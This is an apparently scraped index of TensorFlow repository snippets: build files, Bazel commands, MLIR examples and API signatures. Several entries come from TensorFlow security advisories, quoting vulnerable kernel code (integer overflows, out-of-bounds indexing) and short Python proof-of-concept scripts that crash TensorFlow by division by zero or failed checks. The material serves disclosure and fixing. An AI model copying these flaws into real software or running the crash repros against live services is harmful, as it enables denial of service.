SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsAssociatedFile(
    buf, offset=0
)
```

----------------------------------------

TITLE: Get Root RegexTokenizerOptions from Buffer (Deprecated) Python
DESCRIPTION: Deprecated class method to initialize and return a `RegexTokenizerOptions` object from a FlatBuffers buffer. Users should switch to the non-deprecated `GetRootAs` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsRegexTokenizerOptions(
    buf, offset=0
)
```

----------------------------------------

TITLE: Checking Buffer Identifier - TFLite Metadata Python
DESCRIPTION: This class method checks if the provided buffer (`buf`) at the given offset contains the correct FlatBuffer identifier specific to `ScoreCalibrationOptions`. It helps validate the buffer's type before deserialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
ScoreCalibrationOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)

```

----------------------------------------

TITLE: Calculating Embedding and Lookup Sizes in TFLite C++ Kernel
DESCRIPTION: This C++ snippet, part of a TensorFlow Lite kernel for sparse embedding lookup, calculates `embedding_size` and `lookup_size` based on input tensor dimensions (`dense_shape` and `value`). The vulnerability arises because these sizes are computed by multiplying dimension values provided in the user'supplied model data, making the multiplications susceptible to integer overflow if dimensions are sufficiently large. An overflow in these calculations was identified as the root cause of a security vulnerability (TFSA-2022-024).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-024.md#_snippet_0

LANGUAGE: C++
CODE:
```
  int embedding_size = 1;
  int lookup_size = 1;
  for (int i = 0; i < lookup_rank - 1; i++, k++) {
    const int dim = dense_shape->data.i32[i];
    lookup_size *= dim;
    output_shape->data[k] = dim;
  }
  for (int i = 1; i < embedding_rank; i++, k++) {
    const int dim = SizeOfDimension(value, i);
    embedding_size *= dim;
    output_shape->data[k] = dim;
  }
```

----------------------------------------

TITLE: Validating Inputs in SparseMatrixSparseCholesky Kernel (C++)
DESCRIPTION: This C++ snippet presents the `ValidateInputs` function used by the `SparseMatrixSparseCholesky` kernel. It includes validation checks using the `OP_REQUIRES` macro, highlighting how a validation failure causes an early return from this function, but execution continues in the calling `Compute` function, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-018.md#_snippet_2

LANGUAGE: C++
CODE:
```
void ValidateInputs(OpKernelContext* ctx,
    const CSRSparseMatrix& sparse_matrix,
    const Tensor& permutation_indices, int* batch_size,
    int64* num_rows) {
  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value, ...)
  ...
}
```

----------------------------------------

TITLE: Creating TFLite Integer Array in C++
DESCRIPTION: This snippet shows the `TfLiteIntArrayCreate` function responsible for allocating memory for a TFLite integer array. It calls `TfLiteIntArrayGetSizeInBytes` to determine the allocation size and then uses `malloc`. The vulnerability occurs because `alloc_size` is an `int` which can overflow if the size returned by `TfLiteIntArrayGetSizeInBytes` exceeds the maximum value of an `int`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-023.md#_snippet_0

LANGUAGE: C++
CODE:
```
TfLiteIntArray* TfLiteIntArrayCreate(int size) {
  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);
  // ...
  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);
  // ...
}
```

----------------------------------------

TITLE: Triggering Division by Zero Vulnerability with QuantizedBiasAdd (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger an integer division by zero in TensorFlow's `tf.raw_ops.QuantizedBiasAdd` by providing empty input and bias tensors with specific data types and float ranges. This reproducible example highlights the vulnerability described in TFSA-2021-034 (CVE-2021-29546).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-034.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)
bias = tf.constant([], shape=[0], dtype=tf.quint8)
min_input = tf.constant(-10.0, dtype=tf.float32)
max_input = tf.constant(-10.0, dtype=tf.float32)
min_bias = tf.constant(-10.0, dtype=tf.float32)
max_bias = tf.constant(-10.0, dtype=tf.float32)

tf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,
                            max_input=max_input, min_bias=min_bias,
                            max_bias=max_bias, out_type=tf.qint32)
```

----------------------------------------

TITLE: Applying Apache License Boilerplate - Plain Text
DESCRIPTION: This snippet provides the standard boilerplate notice required to apply the Apache License, Version 2.0, to a work. It should be included in the source files, typically enclosed within the appropriate comment syntax for the file format. The bracketed fields `[yyyy]` and `[name of copyright owner]` must be replaced with the actual copyright year and owner information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/THIRD_PARTY_NOTICES.txt#_snippet_0

LANGUAGE: Plain Text
CODE:
```
Copyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the "License");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an "AS IS" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.
```

----------------------------------------

TITLE: Installing Clang 6.0 on Debian 8 using apt (sh)
DESCRIPTION: This shell script sequence adds the official LLVM apt repository for Debian 'Jessie' (version 8) to the system's package sources. It then imports the repository's GPG key for verification, updates the local package list, and finally installs the specified 'clang' compiler and 'lld' linker packages. This ensures the required Clang 6.0 version is available for the Bazel toolchain.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/toolchains/clang6/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
cat >>/etc/apt/sources.list <<'EOF'
deb http://apt.llvm.org/jessie/ llvm-toolchain-jessie main
deb-src http://apt.llvm.org/jessie/ llvm-toolchain-jessie main
EOF
wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add -
apt-key fingerprint |& grep '6084 F3CF 814B 57C1 CF12  EFD5 15CF 4D18 AF4F 7421'
apt-get update
apt-get install clang lld
```

----------------------------------------

TITLE: Checking Tensor Type Alignment (C++)
DESCRIPTION: This C++ function snippet from `tensorflow/core/framework/tensor.cc` shows the `CheckTypeAndIsAligned` method. It uses a `CHECK_EQ` macro to assert that the tensor's internal data type (`dtype()`) matches the `expected_dtype` provided as an argument. If the types do not match, the program will abort with a fatal error, indicating a type mismatch. This is the specific check that fails due to the vulnerability when type confusion occurs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-008.md#_snippet_1

LANGUAGE: C++
CODE:
```
void Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {
  CHECK_EQ(dtype(), expected_dtype)
      << " " << DataTypeString(expected_dtype) << " expected, got "
      << DataTypeString(dtype());
  ...
}
```

----------------------------------------

TITLE: Defining MLIR Library - MHLO ScatterUtils - CMake
DESCRIPTION: Defines a CMake target for the `MhloScatterUtils` MLIR library. It uses `mhlo_scatter_gather_utils.cc` as the source file, depends on `MLIRhlo_opsIncGen`, links the MLIR `Core` component, and links publicly against the `MhloDialect`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/utils/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloScatterUtils
  mhlo_scatter_gather_utils.cc

  DEPENDS
  MLIRhlo_opsIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
)
```

----------------------------------------

TITLE: Running AutoGraph Unit Tests using Bazel (Shell)
DESCRIPTION: This command executes all unit tests within the specified AutoGraph directory using the Bazel build tool. It includes optimization flags (`--config=opt`, `--copt=-O3`, `--copt=-march=native`) to improve performance. Running this command from the root of the TensorFlow repository is crucial to verify that code changes pass existing tests before contributing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/CONTRIBUTING.md#_snippet_0

LANGUAGE: shell
CODE:
```
bazel test --config=opt --copt=-O3 --copt=-march=native \
  //tensorflow/contrib/autograph/...
```

----------------------------------------

TITLE: Representing TensorFlow AddV2 Op in TFG MLIR Dialect (MLIR)
DESCRIPTION: This MLIR snippet shows the structure of an operation in the new 'TensorFlow Graph' (tfg) dialect. It maps a TensorFlow `AddV2` node, explicitly including regular inputs (`%placeholder`, `%placeholder_1`), control dependencies (`[%ctl_1, %ctl_2]`), device information (`device`, `assigned_device`), node name (`name`), op-specific attributes (`{some_attribute = "some attr!"}`), and the type signature, alongside its results (`%AddV2`, `%ctl`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_3

LANGUAGE: MLIR
CODE:
```
%AddV2, %ctl = tfg.AddV2(%placeholder, %placeholder_1) [%ctl_1, %ctl_2]
                     device("GPU") assigned_device("TPU") name("add")
                     {some_attribute = "some attr!"}
                     : (tensor<*xi32>, tensor<*xi32>) -> (tensor<*xi32>)
```

----------------------------------------

TITLE: Run Bazel XLA Tests (ARM64) - Shell
DESCRIPTION: Executes Bazel tests for the TensorFlow XLA component on macOS ARM64. It applies various tag filters to exclude GPU-specific, macOS-specific, and non-OSS tests, sets build configurations, manages parallelism, handles flaky tests, uploads build results, and specifies the macOS minimum OS version and test temporary directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_19

LANGUAGE: Shell
CODE:
```
bazel test --build_tag_filters=-no_oss,-gpu,-no_mac,-mac_excluded,-requires-gpu-nvidia,-requires-gpu-amd --test_tag_filters=-no_oss,-gpu,-no_mac,-mac_excluded,-requires-gpu-nvidia,-requires-gpu-amd --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --macos_minimum_os=10.15 --test_tmpdir=/tmpfs/bazel_output --test_size_filters=small,medium --define=xnn_enable_avxvnniint8=false -- //xla/... -//xla/hlo/experimental/... -//xla/python_api/... -//xla/python/... -//xla/service/gpu/...
```

----------------------------------------

TITLE: Macro populate_tf_source_vars
DESCRIPTION: Defines a CMake macro that wraps `populate_source_vars` to work relative to the `TF_SOURCE_DIR`. It simplifies finding source and header files within the main TensorFlow source directories, applying the same filtering logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_11

LANGUAGE: CMake
CODE:
```
# Simplifies inclusion of non-test sources and headers from a directory
# relative to TF_SOURCE_DIR. See populate_source_vars() for the description of
# arguments including and following SOURCES_VAR.
macro(populate_tf_source_vars RELATIVE_DIR SOURCES_VAR)
  populate_source_vars(
    "${TF_SOURCE_DIR}/${RELATIVE_DIR}" ${SOURCES_VAR} ${ARGN}
  )
endmacro()
```

----------------------------------------

TITLE: Configuring CMake Policies and Project
DESCRIPTION: This section sets specific CMake policies for target naming and RPATH handling. It then defines the project name as 'tensorflow-lite' and specifies the enabled languages as C and CXX. It also enforces position-independent code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
# Double colon in target name means ALIAS or IMPORTED target.
cmake_policy(SET CMP0028 NEW)
# Enable MACOSX_RPATH (@rpath) for built dynamic libraries.
cmake_policy(SET CMP0042 NEW)
project(tensorflow-lite C CXX)
set(CMAKE_POSITION_INDEPENDENT_CODE ON)
```

----------------------------------------

TITLE: Conditionally Adding Python Bindings Subdirectory (CMake)
DESCRIPTION: Includes the 'python' subdirectory if the CMake variable MHLO_ENABLE_BINDINGS_PYTHON is enabled. This allows for the configuration and inclusion of Python-related tests and build steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
if(MHLO_ENABLE_BINDINGS_PYTHON)
  add_subdirectory(python)
endif()
```

----------------------------------------

TITLE: Execute Multi-Process HLO Runner with MPI Bash
DESCRIPTION: These commands first make the previously created `run.sh` script executable (`chmod a+x`) and then execute it using `mpirun` across 8 processes (`-np 8`) with root privileges allowed (`--allow-run-as-root`), launching the multi-process HLO runner.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_10

LANGUAGE: bash
CODE:
```
chmod a+x run.sh
mpirun --allow-run-as-root -np 8 run.sh
```

----------------------------------------

TITLE: Linking Libraries for label_image Target (CMake)
DESCRIPTION: Links the required libraries, including the main `tensorflow-lite` library, profiling-related libraries (`profiling_info_proto`, `libprotobuf`), and others necessary for the `label_image` executable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_9

LANGUAGE: cmake
CODE:
```
target_link_libraries(label_image
  tensorflow-lite
  profiling_info_proto
  libprotobuf
)
```

----------------------------------------

TITLE: Building profiling_info_proto Protobuf Target CMake
DESCRIPTION: Defines a CMake library target named `profiling_info_proto` and sets up a custom command to generate its C++ sources and headers from `profiling_info.proto` using the `protoc` executable. It then adds the generated files to the target, links against the main Protobuf library, and specifies necessary include directories for the compiled code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/profiling/proto/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
add_library(profiling_info_proto profiling_info.proto)

list(APPEND profiling_info_generated_files
    ${TFLITE_GENERATED_HEADERS_DIR}/profiling/proto/profiling_info.pb.cc
    ${TFLITE_GENERATED_HEADERS_DIR}/profiling/proto/profiling_info.pb.h)

# Generate profiling_info.pb.cc and profiling_info.pb.h from
# profiling_info.proto using protoc. Once the protobuf package version is
# upgraded, we can use protobuf_generate_cpp/protobuf_generate here directly.
add_custom_command(
    OUTPUT ${profiling_info_generated_files}
    COMMAND ${Protobuf_PROTOC_EXECUTABLE}
    ARGS --cpp_out=${CMAKE_BINARY_DIR} --proto_path=${TENSORFLOW_SOURCE_DIR} ${CMAKE_CURRENT_SOURCE_DIR}/profiling_info.proto
    DEPENDS ${Protobuf_PROTOC_EXECUTABLE} ${CMAKE_CURRENT_SOURCE_DIR}/profiling_info.proto
)

set_source_files_properties(${profiling_info_generated_files} PROPERTIES GENERATED TRUE)
target_sources(profiling_info_proto PRIVATE ${profiling_info_generated_files})
target_link_libraries(profiling_info_proto protobuf::libprotobuf)
target_include_directories(profiling_info_proto PUBLIC ${CMAKE_BINARY_DIR})
```

----------------------------------------

TITLE: Set CMake Policy CMP0068
DESCRIPTION: Sets CMake policy CMP0068 to NEW, which affects the default runtime installation path on macOS. It also enables CMAKE_BUILD_WITH_INSTALL_NAME_DIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
if(POLICY CMP0068)
  cmake_policy(SET CMP0068 NEW)
  set(CMAKE_BUILD_WITH_INSTALL_NAME_DIR ON)
endif()
```

----------------------------------------

TITLE: Vectorizing Tensor Accesses - MLIR
DESCRIPTION: This snippet shows the vectorization of tensor loads and stores within the loop. Based on the contiguous access pattern defined by the indexing map, tensor.extract is replaced by vector.transfer_read hoisted before the loop, and tensor.insert within the loop is replaced by vector.insert accumulating results into a vector, which is then written back using vector.transfer_write after the loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_4

LANGUAGE: MLIR
CODE:
```
func.func @main(%input: tensor<12582912xbf16>, %output: tensor<12582912xbf16>) -> tensor<12582912xbf16> {
 %vector_0 = arith.constant dense<0.000000e+00> : vector<4xbf16>
 %0 = xla_gpu.apply_indexing #map(%thread_id_x, %block_id_x, %c0)
 %2 = vector.transfer_read %input[%0], %cst {in_bounds = [true]} : tensor<12582912xbf16>, vector<4xbf16>
 %xla_loop:2 = scf.for %vector_index = %c0 to %c4 step %c1
     iter_args(%iter = %output, %iter_vector = %vector_0) -> (tensor<12582912xbf16>, vector<4xbf16>) {
   %5 = vector.extract %2[%vector_index] : bf16 from vector<4xbf16>
   %6 = arith.mulf %5, %5 : bf16
   %7 = arith.mulf %6, %5 : bf16
   %8 = arith.mulf %7, %cst_4 : bf16
   %9 = arith.addf %5, %8 : bf16
   %10 = arith.mulf %9, %cst_3 : bf16
   %11 = math.tanh %10 : bf16
   %12 = arith.addf %11, %cst_2 : bf16
   %13 = arith.mulf %12, %cst_1 : bf16
   %14 = arith.mulf %5, %13 : bf16
   %15 = vector.insert %14, %iter_vector [%vector_index] : bf16 into vector<4xbf16>
   scf.yield %iter, %15 : tensor<12582912xbf16>, vector<4xbf16>
 }
 %4 = vector.transfer_write %xla_loop#1, %output[%0] {in_bounds = [true]}
     : vector<4xbf16>, tensor<12582912xbf16>
 return %4 : tensor<12582912xbf16>
}
```

----------------------------------------

TITLE: Defining MLIR Library Target (CMake)
DESCRIPTION: Defines a CMake library target named `DeallocationPasses` using the `add_mlir_library` function. It specifies the source files (`buffer_reuse.cc`, `buffer_deallocation.cc`), build dependencies (`MLIRDeallocationPassesIncGen`, `MLIRDeallocationUtils`), public linked components (`Core`), and various public linked MLIR libraries required for building the deallocation passes library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/deallocation/transforms/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
add_mlir_library(DeallocationPasses
  buffer_reuse.cc
  buffer_deallocation.cc

  DEPENDS
  MLIRDeallocationPassesIncGen
  MLIRDeallocationUtils

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MLIRAnalysis
  MLIRArithDialect
  MLIRBufferizationDialect
  MLIRControlFlowInterfaces
  MLIRFuncDialect
  MLIRIR
  MLIRLLVMCommonConversion
  MLIRLLVMDialect
  MLIRMemRefDialect
  MLIRPass
  MLIRSupport
)
```

----------------------------------------

TITLE: Conditionally Including 'python' Subdirectory in CMake
DESCRIPTION: Conditionally adds the 'python' subdirectory to the CMake build. The subdirectory is included only if the CMake variable 'MHLO_ENABLE_BINDINGS_PYTHON' evaluates to true, typically enabling the build of Python bindings or related components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/CMakeLists.txt#_snippet_1

LANGUAGE: cmake
CODE:
```
if(MHLO_ENABLE_BINDINGS_PYTHON)
  add_subdirectory(python)
endif()
```

----------------------------------------

TITLE: Initializing TFLite ObjectDetector Class in Python
DESCRIPTION: This is the constructor signature for the `ObjectDetector` class. It requires an `ObjectDetectorOptions` object and an internal `_CppObjectDetector` instance. Users typically create instances using the provided class methods `create_from_file` or `create_from_options` rather than calling this directly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.vision.ObjectDetector(
    options: <a href="../../../tflite_support/task/vision/ObjectDetectorOptions"><code>tflite_support.task.vision.ObjectDetectorOptions</code></a>,
    detector: _CppObjectDetector
) -> None
```

----------------------------------------

TITLE: Removing Default Hermetic CUDA/CUDNN Setup (Bazel)
DESCRIPTION: This snippet shows lines that should be removed from a project's WORKSPACE file as a prerequisite for using custom distribution dictionaries directly, rather than relying on the standard hermetic setup loaded from predefined JSON files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_10

LANGUAGE: Bazel
CODE:
```
<...>
   "CUDA_REDIST_JSON_DICT",
<...>
   "CUDNN_REDIST_JSON_DICT",
<...>

cuda_json_init_repository(
   cuda_json_dict = CUDA_REDIST_JSON_DICT,
   cudnn_json_dict = CUDNN_REDIST_JSON_DICT,
)

load(
   "@cuda_redist_json//:distributions.bzl",
   "CUDA_REDISTRIBUTIONS",
   "CUDNN_REDISTRIBUTIONS",
)
```

----------------------------------------

TITLE: Compressing Single-Op tf_executor.island MLIR
DESCRIPTION: This snippet demonstrates the simplified syntax for `tf_executor.island` when it wraps only a single operation (`tf.Add`). The result of the wrapped operation is implicitly yielded as the island's main data output. It still takes a control dependency input (`%ctl0`) and produces a data and a control result (`%2`, `%ctl2`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/tf_dialects.md#_snippet_3

LANGUAGE: MLIR
CODE:
```
%2, %ctl2 = tf_executor.island(%ctl0) wraps tf.Add %1, %0 : tensor<*xf32>
```

----------------------------------------

TITLE: Configuring CMake Test Utility for Cross-Compiling
DESCRIPTION: Conditionally copies a test utility CMake script when cross-compiling is enabled. This script facilitates running kernel tests with launch arguments, which is often necessary in cross-compilation environments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
if(${CMAKE_CROSSCOMPILING})
  configure_file(
    ${TFLITE_SOURCE_DIR}/tools/cmake/test_utils/run-tests.cmake
    ${CMAKE_CURRENT_BINARY_DIR}/run-tests.cmake
    COPYONLY
  )
endif()
```

----------------------------------------

TITLE: Defining MLIR Library - MHLO RngUtils - CMake
DESCRIPTION: Defines a CMake target for the `MhloRngUtils` MLIR library. It includes `mhlo_rng_utils.cc` as the source, depends on `MLIRhlo_opsIncGen` for generated code, links the MLIR `Core` component, and links publicly against several MLIR/MHLO dialects and utilities.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/utils/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloRngUtils
  mhlo_rng_utils.cc

  DEPENDS
  MLIRhlo_opsIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MLIRArithDialect
  MLIRIR
  MLIRLinalgUtils
  MLIRMathDialect
  MLIRRewrite
  MLIRSupport
  MLIRTensorDialect
  MLIRTransforms
)
```

----------------------------------------

TITLE: Accessing TFLite Tensor Data C++
DESCRIPTION: This snippet shows the standard method used in TFLite kernels to retrieve a tensor's data pointer using a double indexing pattern. It indexes into the subgraph's `tensors` array using an index obtained from the node's input data, which is the source of the vulnerability when the index is -1.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-005.md#_snippet_0

LANGUAGE: C++
CODE:
```
return &context->tensors[node->inputs->data[index]];
```

----------------------------------------

TITLE: Triggering Conv3D Invalid Shape Assertion - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how providing tensors with incompatible shapes to TensorFlow's `tf.raw_ops.Conv3D` can trigger an Eigen assertion failure. This occurs because the input and filter dimensions violate expected constraints for the operation, leading to a program crash. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-006.md#_snippet_2

LANGUAGE: Python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Demonstrating RandomPoissonV2 CHECK fail - TensorFlow Python
DESCRIPTION: This Python snippet uses TensorFlow to demonstrate a denial-of-service vulnerability in the `tf.raw_ops.RandomPoissonV2` operation. It shows how large input shapes and rates can trigger a `CHECK` failure, crashing the process. The snippet defines large random inputs for `shape` and `rate` and calls the operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-133.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)
arg_2=0
arg_3=0
arg_4=tf.int32
arg_5=None
tf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,
                           seed2=arg_3, dtype=arg_4, name=arg_5)
```

----------------------------------------

TITLE: Demonstrating Division by Zero Vulnerability in TensorFlow ResourceGather (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability (TFSA-2021-127, CVE-2021-37653) in `tf.raw_ops.ResourceGather`. It creates a zero-shaped tensor variable and attempts to gather an index (which fails internally due to zero batch size), leading to a crash. This code acts as a proof-of-concept for the reported security issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-127.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)
v = tf.Variable(tensor)
tf.raw_ops.ResourceGather(
    resource=v.handle,
    indices=[0],
    dtype=tf.uint32,
    batch_dims=1,
    validate_indices=False)

```

----------------------------------------

TITLE: Reproducing tf.io.decode_raw Crash - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the vulnerability in `tf.io.decode_raw` by providing string inputs, a wider datatype like `tf.uint16`, and a specific `fixed_length`. Executing this code in affected TensorFlow versions will likely cause an interpreter crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-102.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.io.decode_raw(tf.constant(["1","2","3","4"]), tf.uint16, fixed_length=4)
```

----------------------------------------

TITLE: Getting Root as ValueRange (Deprecated) in Python
DESCRIPTION: This deprecated class method also retrieves the root `ValueRange` object from a buffer, taking the buffer (`buf`) and an optional starting `offset`. Users should switch to using the `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRange.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAsValueRange(
    buf, offset=0
)
```

----------------------------------------

TITLE: Defining and Validating Source Directory CMake
DESCRIPTION: Defines a cache variable `FFT2D_SOURCE_DIR` for the location of the fft2d source files and provides a help string. It then checks if this variable is set; if not, it outputs a fatal error message and halts the configuration process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(FFT2D_SOURCE_DIR "" CACHE PATH
  "Directory that contains the fft2d project"
)
if(NOT FFT2D_SOURCE_DIR)
  message(FATAL_ERROR "Must specify source directory")
endif()
```

----------------------------------------

TITLE: Declare MLIR HLO Dialect Python Sources Group
DESCRIPTION: This command declares a nested source group specifically for dialect-specific Python sources within the main MLIR HLO group. The `ADD_TO_PARENT` argument links this new group to the previously declared `MLIRHLOPythonSources` group.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
declare_mlir_python_sources(MLIRHLOPythonSources.Dialects
  ADD_TO_PARENT MLIRHLOPythonSources
)
```

----------------------------------------

TITLE: Vulnerable Loop in RaggedBinCount C++ Kernel
DESCRIPTION: This C++ snippet shows the specific loop within the TensorFlow `RaggedBinCount` kernel implementation where the heap buffer overflow vulnerability resides. The `while` loop's logic, combined with a small `splits` tensor provided by the user, can cause `batch_idx` to exceed the bounds of the `splits` tensor, leading to an illegal memory access during the `splits(batch_idx)` call. Part of the internal TensorFlow kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-001.md#_snippet_1

LANGUAGE: C++
CODE:
```
for (int idx = 0; idx < num_values; ++idx) {
  while (idx >= splits(batch_idx)) {
    batch_idx++;
  }
  ...
}
```

----------------------------------------

TITLE: Hoisting Loop Invariants MLIR TensorFlow
DESCRIPTION: Illustrates how the -tf-hoist-loop-invariant pass moves loop-invariant operations, including ReadVariableOp for read-only variables, outside of a tf.WhileRegion loop. The first code block shows the original loop structure, and the second shows the transformed structure with hoisted operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_31

LANGUAGE: MLIR
CODE:
```
func.func @hoist_loop_invariant(%arg0, %arg1) {
%var = "tf.VarHandleOp"() {container="", shared_name="var_name", device = "/device:CPU:0"}
       %results:2 = "tf.WhileRegion"(%arg0, %arg1) ({
       ^bb0(%arg2, %arg3):
         %0 = "tf.OpA"() {is_stateless = true}
         "tf.Yield"(%0)
       }, {
       ^bb0(%arg2, %arg3):
  %1 = "tf.ReadVariableOp"(%var)
         %2 = "tf.OpB"(%1) {is_stateless = true}
         %3 = "tf.OpC"(%arg2, %2) {is_stateless = true}
         %4 = "tf.OpD"(%arg3, %2) {is_stateless = true}
         "tf.Yield"(%3, %4)
       }) {is_stateless = true}
       return %results#0, %results#1
     }
```

LANGUAGE: MLIR
CODE:
```
func.func @hoist_loop_invariant(%arg0, %arg1) {
%var = "tf.VarHandleOp"() {container="", shared_name="var_name", device = "/device:CPU:0"}
%1 = "tf.ReadVariableOp"(%var)
